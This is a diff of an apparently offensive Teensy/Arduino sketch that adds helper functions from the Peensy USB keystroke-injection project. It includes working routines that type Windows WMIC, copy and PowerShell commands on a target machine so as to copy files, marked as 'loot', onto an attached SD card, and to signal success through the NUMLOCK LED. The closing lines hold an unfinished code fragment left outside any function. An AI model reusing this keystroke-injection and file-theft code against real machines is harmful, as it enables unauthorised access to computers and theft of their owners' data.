@@ -1,3 +1,16 @@
+/*
+
+This file contains various functions from the Peensy project that I've decided not to use in mine. 
+
+*/
+
+// NUM, SCROLL, CAPS Led keys checking. We only use NUMLOCK in this sketch. 
+int ledkeys(void) {return int(keyboard_leds);}
+bool is_scroll_on(void) {return ((ledkeys() & 4) == 4) ? true : false;}
+bool is_caps_on(void) {return ((ledkeys() & 2) == 2) ? true : false;}
+bool is_num_on(void) {return ((ledkeys() & 1) == 1) ? true : false;}
+
+
 // An example for a fallback Teensy CMD sequence you can employ using a DIP switch or on failure of the secure_prompt function. 
 // Minmal reasonable values are : secure_prompt(3,700); 
 // Not used in this sketch. 
@@ -307,7 +320,7 @@ void type_internal_sd_binary(char *binaryname)
   delay(1000);
 }
 
-// Original main function, might of been mucked around 
+// Original Peensy main function, might of been mucked around before I moved it here. 
 void peensyMain(void)
 {
   bool arch; // 0 = 32 bit, 1 = 64 bit.
@@ -352,3 +365,75 @@ void peensyMain(void)
     wincopy_to_sd_card("payload_result.txt" ,"payload_result.txt","PAYLOAD",3,700);
   }
 }
+
+// Preforms a Windows copy operation from the target machine to the attached FAT formatted SD drive. The drive VOLUME NAME is also taken as a parameter. For example:
+// wincopy_from_sd_card("c:\\windows\\file.exe" ,"loot.exe","PAYLOAD");
+// Presses numlock on success. Can only be used when the Teensy is loaded as a "Disk (SD Card) + Keyboard"
+bool wincopy_to_sd_card(char *source,char *destination, char *volumename, unsigned int reps, unsigned int millisecs)
+{
+  delay(200);
+  make_sure_numlock_is_off();
+  Keyboard.print(F("for /F \%i in ('WMIC logicaldisk where \"DriveType=2\" list brief ^| find \""));
+  Keyboard.print(volumename);
+  Keyboard.print(F("\"') do copy /Y "));
+  Keyboard.print(source);
+  Keyboard.print(F(" \%i\\"));
+  Keyboard.println(destination);
+  delay(200);
+  delay(700);
+  Keyboard.println(F("cscript numlock.vbs"));
+  delay(700);
+  return check_for_numlock_sucess_teensy(reps,millisecs);
+}
+
+// A function to check if Windows has mounted a drive with VOLUMENAME.
+// Presses numlock on success.
+// Minimal reasonable values depend on file size and USB speed. For a small file: win_check_sd_card_mounted_powershell(4,700);
+// Presses numlock on success. Can only be used when the Teensy is loaded as a "Disk (SD Card) + Keyboard"
+bool win_check_sd_card_mounted_powershell(char *volumename, unsigned int reps, unsigned int millisecs)
+{
+  delay(200);
+  make_sure_numlock_is_off();
+  delay(400);
+  Keyboard.println(F("powershell"));
+  delay(5000);
+  Keyboard.print(F("if (Get-WmiObject -Class Win32_LogicalDisk | Where-Object {($_.DriveType -eq 2) -and ($_.VolumeName -eq \""));
+  Keyboard.print(volumename);
+  Keyboard.println(F("\")}) {Write-host hola;$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{NUMLOCK}')}"));
+  delay(500);
+  Keyboard.println(F("exit"));
+  delay(500);
+  return check_for_numlock_sucess_teensy(reps,millisecs);
+}
+
+//##########################################
+//#### My failed or unfinished functions ####
+//##########################################
+
+//Read state from DIP Switch
+byte address()
+{
+  int i,j=0;
+ 
+  //Get the switches state
+   for(i=0; i<=2; i++)
+   {
+     j = (j << 1) | digitalRead(dipPins[i]);   // read each input pin
+   }
+   return j; //return address
+}
+
+
+// Following was used in the setup() function: 
+
+  // Global values:
+  //int dipPins[] = {8, 9, 10};
+
+  //init and read dip switch positions
+  int i;
+  for(i = 0; i<=2; i++)
+  {
+    pinMode(dipPins[i], INPUT_PULLUP);     
+  }
+
+  // int dipSwitchPos = address();
